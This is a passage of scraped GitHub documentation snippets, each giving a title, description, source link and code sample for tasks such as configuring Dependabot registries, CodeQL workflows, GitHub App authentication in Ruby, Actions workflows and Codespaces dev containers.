https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/configuring-access-to-private-registries-for-dependabot.md#_snippet_15\n\nLANGUAGE: YAML\nCODE:\n```\nregistries:\n  my-pub-registry:\n    type: pub-repository\n    url: https://example-private-pub-repo.dev/optional-path\n    token: ${{secrets.MY_PUB_TOKEN}}\nupdates:\n  - package-ecosystem: \"pub\"\n    directory: \"/\"\n    schedule:\n      interval: \"weekly\"\n    registries:\n      - my-pub-registry\n```\n\n----------------------------------------\n\nTITLE: Specifying languages using a matrix in CodeQL workflow (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to define a matrix strategy within a GitHub Actions workflow to specify which languages should be analyzed by CodeQL. It defines a `language` matrix with a list of languages, and references it in the `Initialize CodeQL` step to configure the analysis.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/troubleshooting-code-scanning/some-languages-not-analyzed.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  analyze:\n    permissions:\n      security-events: write\n      actions: read\n    # ...\n    strategy:\n      fail-fast: false\n      matrix:\n        language: ['csharp', 'c-cpp', 'javascript-typescript']\n\n    steps:\n    # ...\n      - name: Initialize {% data variables.product.prodname_codeql %}\n        uses: {% data reusables.actions.action-codeql-action-init %}\n        with:\n          languages: {% raw %}${{ matrix.language }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Querying hrMemorySize with SNMP v3\nDESCRIPTION: This command queries the `hrMemorySize` using SNMP v3 with authentication and privacy (authPriv security level). It requires the username, authentication password, privacy password, and hostname. The authentication and privacy protocols are SHA and AES, respectively.  It outputs the amount of RAM on the host.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/monitoring-your-instance/monitoring-using-snmp.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n$ snmpget -v 3 -u USERNAME -l authPriv \\\n  -A \"AUTH PASSWORD\" -a SHA \\\n  -X \"PRIVACY PASSWORD\" -x AES \\\n  -O e HOSTNAME HOST-RESOURCES-MIB::hrMemorySize.0\n```\n\n----------------------------------------\n\nTITLE: Configure Git to Use Sublime Text (macOS, Linux)\nDESCRIPTION: This command configures Git to use Sublime Text as the default text editor for operations. The `subl` command is used to open Sublime Text. The `-n` flag opens a new window, and `-w` waits for the file to be closed before continuing.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/git-basics/associating-text-editors-with-git.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngit config --global core.editor \"subl -n -w\"\n```\n\n----------------------------------------\n\nTITLE: Checking GitHub Actions Health (ghe-actions-check)\nDESCRIPTION: This command checks that all services required for GitHub Actions are healthy.  This ensures proper functioning of GitHub Actions on the instance.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_66\n\nLANGUAGE: shell\nCODE:\n```\nghe-actions-check\n```\n\n----------------------------------------\n\nTITLE: Overriding Kerberos SPN in VS Code (JSON)\nDESCRIPTION: This snippet shows how to override the default Service Principal Name (SPN) for Kerberos authentication in VS Code by modifying the user settings JSON file. This is useful if the default SPN derived from the proxy URL is incorrect. Replace `YOUR-SPN` with the correct SPN for your proxy service.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/managing-copilot/configure-personal-settings/configuring-network-settings-for-github-copilot.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n   \"http.proxyKerberosServicePrincipal\": \"YOUR-SPN\",\n```\n\n----------------------------------------\n\nTITLE: Removing Tracking References to Old Branch with Git\nDESCRIPTION: This command removes tracking references to the old branch name from the local repository. This command assumes that the remote repository is named 'origin'. It requires Git to be installed and configured.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/configuring-branches-and-merges-in-your-repository/managing-branches-in-your-repository/renaming-a-branch.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngit remote prune origin\n```\n\n----------------------------------------\n\nTITLE: Generating Python Classes from UML Diagram with Copilot Gemini Flash\nDESCRIPTION: This code snippet shows how Copilot Gemini Flash can generate Python classes based on a UML diagram. It provides an example of a `Cart` class generated from the diagram, including attributes and methods for managing cart items, calculating totals, and placing orders. This demonstrates Copilot Gemini Flash's ability to interpret visual assets and generate code scaffolding, making it suitable for tasks involving UI layouts or form designs.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/ai-models/comparing-ai-models-using-different-tasks.md#_snippet_2\n\nLANGUAGE: python\nCODE:\n```\nfrom cart_item import CartItem\nfrom order import Order\n\nclass Cart:\n    def __init__(self, cart_id, user_id):\n        self.cart_id = cart_id\n        self.user_id = user_id\n        self.items = []\n\n    def add_item(self, item):\n        self.items.append(item)\n\n    def remove_item(self, item):\n        self.items = [i for i in self.items if i != item]\n\n    def calculate_total(self):\n        return sum(item.quantity * item.product.price for item in self.items)\n\n    def place_order(self):\n        # Implementation for placing an order\n        return Order(\"\", None, 0)\n```\n\n----------------------------------------\n\nTITLE: Extending Event Listener for Deployment Events (Ruby)\nDESCRIPTION: This snippet extends the event listener to handle deployment and deployment_status events in addition to pull request events. It introduces placeholders for the `start_deployment`, `process_deployment`, and `update_deployment_status` methods, which will be defined later to manage the deployment process.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/delivering-deployments.md#_snippet_2\n\nLANGUAGE: Ruby\nCODE:\n```\nwhen \"pull_request\"\n  if @payload[\"action\"] == \"closed\" && @payload[\"pull_request\"][\"merged\"]\n    start_deployment(@payload[\"pull_request\"])\n  end\nwhen \"deployment\"\n  process_deployment(@payload)\nwhen \"deployment_status\"\n  update_deployment_status\nend\n```\n\n----------------------------------------\n\nTITLE: Creating a New Project using GraphQL with gh\nDESCRIPTION: This snippet demonstrates how to create a new project using the GitHub CLI (`gh`) and GraphQL. It requires replacing `OWNER_ID` with the node ID of the project owner and `PROJECT_NAME` with the name of the project. The `gh` CLI handles authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_32\n\nLANGUAGE: shell\nCODE:\n```\ngh api graphql -f query='\\n  mutation{\\n    createProjectV2(\\n      input: {\\n        ownerId: \"OWNER_ID\",\\n        title: \"PROJECT_NAME\"\\n      }\\n    ){\\n      projectV2 {\\n        id\\n      }\\n     }\\n  }'\n```\n\n----------------------------------------\n\nTITLE: Reusable Instructions - YAML\nDESCRIPTION: This example shows reusable instructions in a YAML file. It includes queries that are of kind `problem` or `path-problem`, contain the tag `security`, and have `high` or `very-high` precision.  This allows for applying these conditions in multiple suites.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/creating-codeql-query-suites.md#_snippet_15\n\nLANGUAGE: yaml\nCODE:\n```\n- include:\n    kind:\n    - problem\n    - path-problem\n    tags contain: security\n    precision:\n    - high\n    - very-high\n```\n\n----------------------------------------\n\nTITLE: Define CodeQL query for empty then blocks in Java\nDESCRIPTION: This CodeQL query identifies `if` statements in Java code that have an empty `then` block. It selects the `ifstmt` and provides a descriptive message.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/testing-custom-queries.md#_snippet_3\n\nLANGUAGE: ql\nCODE:\n```\nimport java\n\nfrom IfStmt ifstmt\nwhere ifstmt.getThen() instanceof EmptyStmt\nselect ifstmt, \"This if statement has an empty then.\"\n```\n\n----------------------------------------\n\nTITLE: Building a Gem Package\nDESCRIPTION: This command builds a gem package from a gemspec file. Replace `GEM_NAME` with the actual name of the gem you are building.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-rubygems-registry.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ngem build GEM_NAME.gemspec\n```\n\n----------------------------------------\n\nTITLE: Cloning a Git Repository (Ruby)\nDESCRIPTION: This helper method clones a Git repository to the current working directory, pulls the latest changes, and checks out the specified ref (branch, commit SHA, or tag). It uses the `Git` gem for Git operations and requires the repository's full name, the repository name, and the ref to checkout.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_49\n\nLANGUAGE: Ruby\nCODE:\n```\n    # Clones the repository to the current working directory, updates the\n    # contents using Git pull, and checks out the ref.\n    #\n    # full_repo_name  - The owner and repo. Ex: octocat/hello-world\n    # repository      - The repository name\n    # ref             - The branch, commit SHA, or tag to check out\n    def clone_repository(full_repo_name, repository, ref)\n      @git = Git.clone(\"https://x-access-token:#{@installation_token.to_s}@github.com/#{full_repo_name}.git\", repository)\n      pwd = Dir.getwd()\n      Dir.chdir(repository)\n      @git.pull\n      @git.checkout(ref)\n      Dir.chdir(pwd)\n    end\n```\n\n----------------------------------------\n\nTITLE: Authenticating as a GitHub App (Ruby)\nDESCRIPTION: This helper method `authenticate_app` authenticates the application as a GitHub App using a JWT (JSON Web Token). It constructs a payload containing the issue time, expiration time, and app identifier, then cryptographically signs the JWT with the app's private key. Finally, it creates an Octokit client using the JWT as the bearer token, enabling API requests as the GitHub App.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\n    # Instantiate an Octokit client authenticated as a GitHub App.\n    # GitHub App authentication requires that you construct a\n    # JWT (https://jwt.io/introduction/) signed with the app's private key,\n    # so GitHub can be sure that it came from the app and not altered by\n    # a malicious third party.\n    def authenticate_app\n      payload = {\n          # The time that this JWT was issued, _i.e._ now.\n          iat: Time.now.to_i,\n\n          # JWT expiration time (10 minute maximum)\n          exp: Time.now.to_i + (10 * 60),\n\n          # Your GitHub App's identifier number\n          iss: APP_IDENTIFIER\n      }\n\n      # Cryptographically sign the JWT.\n      jwt = JWT.encode(payload, PRIVATE_KEY, 'RS256')\n\n      # Create the Octokit client, using the JWT as the auth token.\n      @app_client ||= Octokit::Client.new(bearer_token: jwt)\n    end\n```\n\n----------------------------------------\n\nTITLE: Installing apt packages on Ubuntu runners\nDESCRIPTION: This snippet demonstrates how to install an `apt` package on an Ubuntu runner as part of a GitHub Actions workflow. It first updates the package index using `sudo apt-get update` and then installs the desired package using `sudo apt-get install`. The workflow is triggered on `push` events.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/using-github-hosted-runners/using-github-hosted-runners/customizing-github-hosted-runners.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: Build on Ubuntu\non: push\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Check out repository code\n        uses: {% data reusables.actions.action-checkout %}\n      - name: Install jq tool\n        run: |\n          sudo apt-get update\n          sudo apt-get install jq\n```\n\n----------------------------------------\n\nTITLE: Aborting a Migration using gh ado2gh\nDESCRIPTION: This command aborts an ongoing migration using the `gh ado2gh abort-migration` command. It requires specifying the migration ID to abort. The command uses the GitHub CLI with the `ado2gh` extension.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-from-azure-devops-to-github-enterprise-cloud/migrating-repositories-from-azure-devops-to-github-enterprise-cloud.md#_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\ngh ado2gh abort-migration --migration-id MIGRATION-ID\n```\n\n----------------------------------------\n\nTITLE: Custom Transformer for Runner Label (Ruby)\nDESCRIPTION: Demonstrates how to create custom transformers for runners, mapping runner labels from the source CI/CD instance to GitHub Actions runner labels. Includes examples for mapping one runner to one or multiple GitHub Actions runners, as well as setting a default runner.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/extending-github-actions-importer-with-custom-transformers.md#_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nrunner \"linux\", \"ubuntu-latest\"\n```\n\nLANGUAGE: ruby\nCODE:\n```\nrunner \"big-agent\", [\"self-hosted\", \"xl\", \"linux\"]\n```\n\nLANGUAGE: ruby\nCODE:\n```\nrunner :default, \"macos-latest\"\n```\n\n----------------------------------------\n\nTITLE: Setting environment variables for steps using `jobs.<job_id>.steps[*].env`\nDESCRIPTION: This YAML snippet demonstrates how to set environment variables for a step using the `jobs.<job_id>.steps[*].env` syntax. It defines `GITHUB_TOKEN`, `FIRST_NAME`, and `LAST_NAME` environment variables that can be used by the action during its execution. For secrets, the `secrets` context should be used.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_29\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  - name: My first action\n    env:\n      GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      FIRST_NAME: Mona\n      LAST_NAME: Octocat\n```\n\n----------------------------------------\n\nTITLE: Updating the `parse_response` function in Ruby\nDESCRIPTION: This Ruby function `parse_response` handles the response from the GitHub API. It parses the JSON body for successful responses (200 OK, 201 Created). If a 401 Unauthorized response is received, it indicates that the token is invalid, and the user is prompted to run the `login` command. For any other response, it prints the response and body before exiting.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-cli-with-a-github-app.md#_snippet_17\n\nLANGUAGE: ruby\nCODE:\n```\ndef parse_response(response)\n  case response\n  when Net::HTTPOK, Net::HTTPCreated\n    JSON.parse(response.body)\n  when Net::HTTPUnauthorized\n    puts \"You are not authorized. Run the `login` command.\"\n    exit 1\n  else\n    puts response\n    puts response.body\n    exit 1\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring .csproj File for NuGet Package\nDESCRIPTION: This XML snippet configures a .csproj file with necessary information for a NuGet package, including the package ID, version, authors, company, description, and repository URL. Replace placeholders like `1.0.0`, `OWNER`, `REPOSITORY`, `AUTHORS`, `COMPANY_NAME`, and `PACKAGE_DESCRIPTION` with appropriate values. The `RepositoryUrl` links the package to a specific GitHub repository.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-nuget-registry.md#_snippet_8\n\nLANGUAGE: xml\nCODE:\n```\n<Project Sdk=\"Microsoft.NET.Sdk\">\n\n  <PropertyGroup>\n    <OutputType>Exe</OutputType>\n    <TargetFramework>netcoreapp3.0</TargetFramework>\n    <PackageId>PROJECT_NAME</PackageId>\n    <Version>1.0.0</Version>\n    <Authors>AUTHORS</Authors>\n    <Company>COMPANY_NAME</Company>\n    <PackageDescription>PACKAGE_DESCRIPTION</PackageDescription>\n    <RepositoryUrl>https://{% ifversion fpt or ghec %}github.com{% else %}HOSTNAME{% endif %}/OWNER/REPOSITORY</RepositoryUrl>\n  </PropertyGroup>\n\n</Project>\n```\n\n----------------------------------------\n\nTITLE: Refactored Python Data Processing Functions\nDESCRIPTION: This Python code refactors the `process_data` function into three separate functions: `cleanse_data` for data cleansing, `print_data` for creating and printing the DataFrame, and `process_data` to orchestrate the calls to the other two functions. This improves code modularity and reusability.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/refactoring-code-with-github-copilot.md#_snippet_7\n\nLANGUAGE: python\nCODE:\n```\ndef cleanse_data(item, price):\n  # Cleanse data\n  item = item.strip()  # Strip whitespace from item\n  price = price.strip()  # Strip whitespace from price\n  price = float(price)  # Convert price to a float\n  return item, price\n\ndef print_data(item, price):\n  # Create and print a DataFrame\n  data = {'Item': [item], 'Price': [price]}\n  df = pd.DataFrame(data)\n  print(df.to_string(index=False))\n\ndef process_data(item, price):\n  item, price = cleanse_data(item, price)\n  print_data(item, price)\n```\n\n----------------------------------------\n\nTITLE: Searching Audit Log with REST API\nDESCRIPTION: This curl command searches an enterprise's audit log for events associated with a specific token, identified by its URI-encoded SHA-256 hash. It uses the `octo-corp` enterprise name and a sample hash value. It requires an authentication token in the `Authorization` header and specifies the desired response format in the `Accept` header.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise/identifying-audit-log-events-performed-by-an-access-token.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncurl --header \"Accept: application/vnd.github+json\" --header \"Authorization: Bearer YOUR-TOKEN\" {% data reusables.rest-api.version-header %} 'https://api.github.com/enterprises/octo-corp/audit-log?phrase=hashed_token:\"EH4L8o6PfCqipALbL%2BQT62lyqUtnI7ql0SPbkaQnjv8\"'\n```\n\n----------------------------------------\n\nTITLE: Upgrading GitHub Enterprise Server\nDESCRIPTION: This command installs the {% data variables.product.prodname_ghe_server %} software on the newly partitioned disk. `PACKAGE-NAME.pkg` must be replaced with the path to the upgrade package. The `-s` and `-t` options specify that the upgrade should be installed on a new disk and the target device.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/updating-the-virtual-machine-and-physical-resources/increasing-storage-capacity.md#_snippet_7\n\nLANGUAGE: Shell\nCODE:\n```\nghe-upgrade PACKAGE-NAME.pkg -s -t /dev/xvdg3\n```\n\n----------------------------------------\n\nTITLE: Running ghe-diagnostics Utility (Shell)\nDESCRIPTION: Executes the `ghe-diagnostics` utility to perform system checks and gather diagnostic information. This command requires no arguments and outputs diagnostic information to the console.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_89\n\nLANGUAGE: shell\nCODE:\n```\nghe-diagnostics\n```\n\n----------------------------------------\n\nTITLE: Exchanging Code for Access Token in Ruby\nDESCRIPTION: This code defines functions to parse API responses and exchange the authorization code for an access token. `parse_response` handles different HTTP response codes, parsing JSON on success or printing the error on failure. `exchange_code` sends a POST request to GitHub's access token endpoint with the client ID, client secret, and authorization code. The function then calls parse_response to handle the API response.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-login-with-github-button-with-a-github-app.md#_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\ndef parse_response(response)\n  case response\n  when Net::HTTPOK\n    JSON.parse(response.body)\n  else\n    puts response\n    puts response.body\n    {}\n  end\nend\n\ndef exchange_code(code)\n  params = {\n    \"client_id\" => CLIENT_ID,\n    \"client_secret\" => CLIENT_SECRET,\n    \"code\" => code\n  }\n  result = Net::HTTP.post(\n    URI(\"{% data variables.product.oauth_host_code %}/login/oauth/access_token\"),\n    URI.encode_www_form(params),\n    {\"Accept\" => \"application/json\"}\n  )\n\n  parse_response(result)\nend\n```\n\n----------------------------------------\n\nTITLE: RubyGems Authentication Credentials\nDESCRIPTION: This snippet shows how to configure RubyGems credentials to authenticate with the GitHub Packages registry using a personal access token (PAT).  The `TOKEN` placeholder should be replaced with the actual PAT.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-rubygems-registry.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n---\n:github: Bearer TOKEN\n```\n\n----------------------------------------\n\nTITLE: Merging Main Branch into Topic Branch\nDESCRIPTION: This command merges changes from the `main` branch into the currently active topic branch. This keeps the topic branch up-to-date with the latest changes from `main` and helps to identify and resolve potential merge conflicts early.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/collaborating-on-github-docs/using-git-on-github-docs.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\ngit merge main\n```\n\n----------------------------------------\n\nTITLE: Analyzing `prepare_job` Output JSON\nDESCRIPTION: This JSON represents the expected output for the `prepare_job` command. It details the state of the job, including network configuration, job container ID, and service container IDs. The context section provides further information about the containers and network.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/customizing-the-containers-used-by-jobs.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"state\": {\n    \"network\": \"example_network_53269bd575972817b43f7733536b200c\",\n    \"jobContainer\": \"82e8219701fe096a35941d869cf3d71af1d943b5d8bdd718857fb87ac3042480\",\n    \"serviceContainers\": {\n      \"redis\": \"60972d9aa486605e66b0dad4abb678dc3d9116f536579e418176eedb8abb9105\"\n    }\n  },\n  \"context\": {\n    \"container\": {\n      \"id\": \"82e8219701fe096a35941d869cf3d71af1d943b5d8bdd718857fb87ac3042480\",\n      \"network\": \"example_network_53269bd575972817b43f7733536b200c\"\n    },\n    \"services\": {\n      \"redis\": {\n        \"id\": \"60972d9aa486605e66b0dad4abb678dc3d9116f536579e418176eedb8abb9105\",\n        \"ports\": {\n          \"8080\": \"8080\"\n        },\n        \"network\": \"example_network_53269bd575972817b43f7733536b200c\"\n      }\n    },\n    \"isAlpine\": true\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Calling AI Model Inference API in GitHub Actions (Bash)\nDESCRIPTION: This Bash script demonstrates how to call the GitHub Models inference API within a GitHub Actions workflow. It uses `curl` to send a request to the API endpoint, including the necessary headers for authentication and content type. The request body is a JSON payload containing the message and model information. Requires a `GITHUB_TOKEN` environment variable.\nSOURCE: https://github.com/github/docs/blob/main/content/github-models/integrating-ai-models-into-your-development-workflow.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ncurl \"https://models.github.ai/inference/chat/completions\" \\\n   -H \"Content-Type: application/json\" \\\n   -H \"Authorization: Bearer $GITHUB_TOKEN\" \\\n   -d '{\n    \"messages\": [\n        {\n           \"role\": \"user\",\n           \"content\": \"Explain the concept of recursion.\"\n        }\n     ],\n     \"model\": \"openai/gpt-4o\"\n  }'\n```\n\n----------------------------------------\n\nTITLE: Version Block for Complex Content Differences\nDESCRIPTION: This snippet demonstrates how to use version blocks (with `ifversion` and `elsif`) to repeat entire paragraphs when the behavior or information differs significantly between versions, making the prose easier to maintain despite the repetition.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/versioning-documentation.md#_snippet_16\n\nLANGUAGE: liquid\nCODE:\n```\n{% raw %}{% ifversion fpt %}\n\nIf you use a Free, Pro, or Team plan, you can do something. Here's more information about the things you can do with a Free, Pro, or Team plan...\n\n{% elsif ghec %}\n\nIf you use GitHub Enterprise Cloud, you can do something else. Here's more information about the things you can do with GitHub Enterprise Cloud...\n\n{% endif %}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Generating a Legacy GitHub Services Report - Shell\nDESCRIPTION: This snippet uses `ghe-legacy-github-services-report` to list repositories using discontinued GitHub Services. Requires SSH access to the administrative shell.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_10\n\nLANGUAGE: shell\nCODE:\n```\nghe-legacy-github-services-report\n```\n\n----------------------------------------\n\nTITLE: Changing Directory in Shell\nDESCRIPTION: Changes the current directory to the hello-world-composite-action repository using the `cd` command. This command is essential for navigating the file system and ensuring that subsequent commands are executed in the correct context.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/creating-a-composite-action.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncd hello-world-composite-action\n```\n\n----------------------------------------\n\nTITLE: Successful SSH Authentication Message\nDESCRIPTION: This snippet represents the successful authentication message displayed after a successful SSH connection to GitHub. It confirms that the user has been authenticated but indicates that shell access is not provided.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/testing-your-ssh-connection.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n> Hi USERNAME! You've successfully authenticated, but GitHub does not\n> provide shell access.\n```\n\n----------------------------------------\n\nTITLE: Uploading SARIF file to GitHub code scanning with codeql CLI\nDESCRIPTION: This command uploads a SARIF file to GitHub code scanning. It requires specifying the SARIF file path, and optionally allows setting the GitHub repository, ref, and commit SHA.  A GitHub Apps token or personal access token with the `security_events` scope must be set via `--github-auth-stdin` or the `GITHUB_TOKEN` environment variable. The tool will attempt to automatically detect repository and ref information from the checkout path.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/github-upload-results.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql github upload-results --sarif=<file> [--github-auth-stdin] [--github-url=<url>] [--repository=<repository-name>] [--ref=<ref>] [--commit=<commit>] [--checkout-path=<path>] <options>...\n```\n\n----------------------------------------\n\nTITLE: YAML Workflow Steps Example\nDESCRIPTION: This YAML snippet showcases the correct indentation (two spaces) and structure for defining steps within a GitHub Actions workflow. It shows the usage of actions such as `actions/checkout` and `actions/setup-python`, along with configuration using the `with` keyword. It uses raw tags to prevent Liquid processing for `python-version`\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_7\n\nLANGUAGE: YAML\nCODE:\n```\nsteps:\n  - uses: {% data reusables.actions.action-checkout %}\n  - name: Setup Python\n    uses: {% data reusables.actions.action-setup-python %}\n    with:\n      python-version: {% raw %}${{ matrix.python }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Cluster Status (ghe-cluster-status)\nDESCRIPTION: Check the health of your nodes and services in a cluster deployment of GitHub Enterprise Server.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_37\n\nLANGUAGE: Shell\nCODE:\n```\nghe-cluster-status\n```\n\n----------------------------------------\n\nTITLE: Setting repository-specific email address in Git\nDESCRIPTION: Sets the email address for a specific Git repository. This overrides the global Git configuration for this repository only. First, navigate to the repository directory. Replace \"YOUR_EMAIL\" with the desired email address.\nSOURCE: https://github.com/github/docs/blob/main/content/account-and-profile/setting-up-and-managing-your-personal-account-on-github/managing-email-preferences/setting-your-commit-email-address.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\ngit config user.email \"YOUR_EMAIL\"\n```\n\n----------------------------------------\n\nTITLE: Setting environment variables in Shell\nDESCRIPTION: These commands set environment variables required for migrating from Bitbucket Server to GitHub Enterprise Cloud using the GitHub CLI extension. They define the GitHub personal access token, Bitbucket Server username, Bitbucket Server password, and optionally the SMB password. Replace TOKEN, USERNAME and PASSWORD with your actual values.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-from-bitbucket-server-to-github-enterprise-cloud/migrating-repositories-from-bitbucket-server-to-github-enterprise-cloud.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nexport GH_PAT=\"TOKEN\"\n     export BBS_USERNAME=\"USERNAME\"\n     export BBS_PASSWORD=\"PASSWORD\"\n     # If your Bitbucket Server instance runs on Windows\n     export SMB_PASSWORD=\"PASSWORD\"\n```\n\n----------------------------------------\n\nTITLE: Authenticating API request using GitHub CLI in YAML workflow\nDESCRIPTION: This YAML workflow demonstrates how to authenticate an API request using the GitHub CLI (`gh`) within a GitHub Actions workflow. It stores the `GITHUB_TOKEN` as an environment variable and utilizes the `gh api` subcommand.  Replace `/PATH` with the desired API endpoint. The `GITHUB_TOKEN` secret is automatically provided by GitHub Actions. No specific inputs or outputs are defined, the API request and its response define the interaction.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/authentication/authenticating-to-the-rest-api.md#_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  use_api:\n    runs-on: ubuntu-latest\n    permissions: {}\n    steps:\n      - env:\n          GH_TOKEN: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n        run: |\n          gh api /PATH\n```\n\n----------------------------------------\n\nTITLE: Creating a GitHub Actions Workflow in YAML\nDESCRIPTION: This YAML snippet defines a GitHub Actions workflow named 'GitHub Actions Demo'. It is triggered on every push event to the repository. The workflow consists of a single job named 'Explore-GitHub-Actions' that runs on an Ubuntu-latest runner. The job includes several steps that echo messages, check out the repository code, list files in the repository, and display the job's status.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/quickstart.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: GitHub Actions Demo\nrun-name: {% raw %}${{ github.actor }}{% endraw %} is testing out GitHub Actions 🚀\non: [push]\njobs:\n  Explore-GitHub-Actions:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"🎉 The job was automatically triggered by a {% raw %}${{ github.event_name }}{% endraw %} event.\"\n      - run: echo \"🐧 This job is now running on a {% raw %}${{ runner.os }}{% endraw %} server hosted by GitHub!\"\n      - run: echo \"🔎 The name of your branch is {% raw %}${{ github.ref }}{% endraw %} and your repository is {% raw %}${{ github.repository }}{% endraw %}.\"\n      - name: Check out repository code\n        uses: {% data reusables.actions.action-checkout %}\n      - run: echo \"💡 The {% raw %}${{ github.repository }}{% endraw %} repository has been cloned to the runner.\"\n      - run: echo \"🖥️ The workflow is now ready to test your code on the runner.\"\n      - name: List files in the repository\n        run: |\n          ls {% raw %}${{ github.workspace }}{% endraw %}\n      - run: echo \"🍏 This job's status is {% raw %}${{ job.status }}{% endraw %}.\"\n```\n\n----------------------------------------\n\nTITLE: Initial devcontainer.json Configuration for Python in Codespaces\nDESCRIPTION: This code snippet represents the initial `devcontainer.json` file generated when configuring a Python project for GitHub Codespaces. It defines the container's name, the Docker image to use (Python 3.11 on Bullseye), and includes a feature for Coverage.py. The commented-out sections show placeholders for port forwarding, post-creation commands, and VS Code customizations. This configuration sets up a basic Python 3 development environment.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/setting-up-your-project-for-codespaces/adding-a-dev-container-configuration/setting-up-your-python-project-for-codespaces.md#_snippet_0\n\nLANGUAGE: JSONC\nCODE:\n```\n// For format details, see https://aka.ms/devcontainer.json. For config options, see the\n// README at: https://github.com/devcontainers/templates/tree/main/src/python\n{\n  \"name\": \"Python 3\",\n  // Or use a Dockerfile or Docker Compose file. More info: https://containers.dev/guide/dockerfile\n  \"image\": \"mcr.microsoft.com/devcontainers/python:0-3.11-bullseye\",\n  \"features\": {\n   